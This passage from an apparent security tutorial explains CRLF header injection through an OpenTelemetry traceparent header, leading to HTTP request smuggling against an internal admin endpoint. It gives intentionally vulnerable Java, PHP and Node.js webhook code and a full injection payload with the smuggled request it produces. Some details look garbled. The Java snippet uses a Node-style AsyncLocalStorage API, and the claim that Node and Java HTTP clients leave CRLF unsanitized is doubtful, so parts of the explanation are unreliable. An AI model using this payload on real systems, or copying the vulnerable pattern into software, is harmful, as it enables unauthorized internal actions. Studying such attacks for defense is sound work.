            String targetUrl,
            Object payload
    ) throws Exception {


        // [1]
        // [2]
        // Extracts the distributed trace ID from the asynchronous execution context

        String currentTraceId =
                AsyncLocalStorage.getStore()
                        .get("traceparent");



        // [3]
        // [4]
        // Blindly concatenates the unvalidated trace context directly into the outbound headers

        HttpRequest request =
                HttpRequest.newBuilder()
                        .uri(URI.create(targetUrl))
                        .header(
                            "Content-Type",
                            "application/json"
                        )
                        .header(
                            "traceparent",
                            currentTraceId
                        )
                        .POST(
                            HttpRequest.BodyPublishers.ofString(
                                JsonSerializer.serialize(payload)
                            )
                        )
                        .build();



        HttpResponse<String> response =
                httpClient.send(
                    request,
                    HttpResponse.BodyHandlers.ofString()
                );


        return response.statusCode();
    }
}
```


{% endtab %}

{% tab title="PHP" %}
```php
class WebhookDispatchService
{
    public function dispatch(string $targetUrl, array $payload): void
    {
        // [1]
        // [2]
        $traceId = LogContext::get('x-b3-traceid');

        // [3]
        // [4]
        // Using a raw stream context for HTTP requests (highly susceptible to header injection)
        $options = [
            'http' => [
                'header'  => "Content-type: application/json\r\n" .
                             "x-b3-traceid: {$traceId}\r\n", 
                'method'  => 'POST',
                'content' => json_encode($payload),
            ],
        ];

        $context  = stream_context_create($options);
        file_get_contents($targetUrl, false, $context);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
const http = require('http'); // Utilizing low-level HTTP module vulnerable to CRLF

class WebhookDispatchService {
    static async dispatch(targetUrl, payload) {
        // [1]
        // [2]
        // Extracts the distributed trace ID from the asynchronous execution context
        let currentTraceId = asyncLocalStorage.getStore().get('traceparent');

        const options = {
            method: 'POST',
            // [3]
            // [4]
            // Blindly concatenates the unvalidated trace context directly into the outbound headers
            headers: {
                'Content-Type': 'application/json',
                'traceparent': currentTraceId 
            }
        };

        return new Promise((resolve, reject) => {
            const req = http.request(targetUrl, options, (res) => {
                resolve(res.statusCode);
            });

            req.on('error', reject);
            req.write(JSON.stringify(payload));
            req.end();
        });
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] To maintain observability across a sprawling microservice ecosystem, engineers implement strict Context Propagation, requiring all external and internal API calls to carry a distributed trace identifier, \[2] To support B2B integrations, the API Gateway permits external clients to provide their own trace IDs (e.g., standard OpenTelemetry `traceparent`), allowing external tenants to correlate enterprise logs with their own internal systems, \[3] The architecture assumes that tracing headers are entirely benign, mathematically generated strings, explicitly omitting them from standard WAF or Gateway sanitization pipelines, \[4] The execution sink. When the internal microservice executes a legitimate outbound HTTP request (e.g., firing a webhook), the Tracing Interceptor automatically pulls the active trace ID from memory and injects it into the outbound headers. Because the underlying HTTP client (e.g., Node.js `http`, PHP `stream_context`) fails to sanitize the injected header values for CRLF characters, the attacker's payload splits the HTTP envelope. The resulting desynchronization allows the attacker to forge a completely autonomous, internal HTTP request originating from the highly trusted core microservice

```http
// 1. Attacker controls a web server that receives outbound webhooks from the enterprise platform.
// 2. Attacker initiates an action that triggers a webhook to their own server.
// 3. Attacker injects the HTTP Request Smuggling payload into the standard OpenTelemetry traceparent header.

POST /api/v1/documents/export HTTP/1.1
Host: api.enterprise.tld
Authorization: Bearer <valid_token>
Content-Type: application/json
traceparent: 00-0af7651916cd43dd8448eb211c80319c-b7ad6b7169203331-01\r\n\r\nPOST /internal/admin/purge-cache HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Length: 15\r\n\r\n{"force":true}\r\nDummy: 

{
  "documentId": "DOC-123",
  "webhookCallbackUrl": "http://internal-routing-mesh.local" 
}

// 4. The API Gateway accepts the request and pushes the context into the background processing queue.
// 5. The background worker generates the document.
// 6. The Webhook Dispatcher initiates the HTTP POST request to the webhookCallbackUrl.
// 7. The Tracing Interceptor pulls the poisoned traceparent from memory and injects it into the headers.

// 8. The underlying TCP socket flushes the physical stream:
POST /webhook HTTP/1.1
Host: internal-routing-mesh.local
Content-Type: application/json
traceparent: 00-0af7651916cd43dd8448eb211c80319c-b7ad6b7169203331-01

POST /internal/admin/purge-cache HTTP/1.1
Host: 127.0.0.1
Content-Length: 15

{"force":true}
Dummy: \r\n
[Remaining body...]

// 9. The internal routing mesh proxy receives the connection. It parses the first request (the webhook).
// 10. Due to HTTP Keep-Alive, it immediately parses the second request in the buffer: the forged POST.
// 11. The forged request executes directly against the local loopback interface, completely bypassing authentication.
```
{% endstep %}

{% step %}
To achieve complete lifecycle observability across distributed applications, architects embedded automated Context Propagation interceptors deep within the HTTP client transport layers. The security posture relied heavily on the implicit structural assumption that distributed trace identifiers were inert, hex-encoded diagnostic metadata. By completely excluding these headers from edge sanitization routines, the API Gateway permitted hostile characters to silently transit the service mesh. The attacker weaponized this passive propagation path by embedding carriage return and line feed (`\r\n`) characters into the standard OpenTelemetry header. The payload remained dormant until the internal microservice initiated a legitimate outbound connection. The automated Tracing Interceptor inadvertently injected the poisoned context directly into the transport layer's socket writer. The raw socket evaluated the control characters, physically fracturing the HTTP envelope into multiple discrete requests. This architectural bypass empowered the attacker to forge highly privileged internal commands originating directly from the IP address and trust context of the central processing infrastructure
{% endstep %}
{% endstepper %}

***

## Cheat Sheet
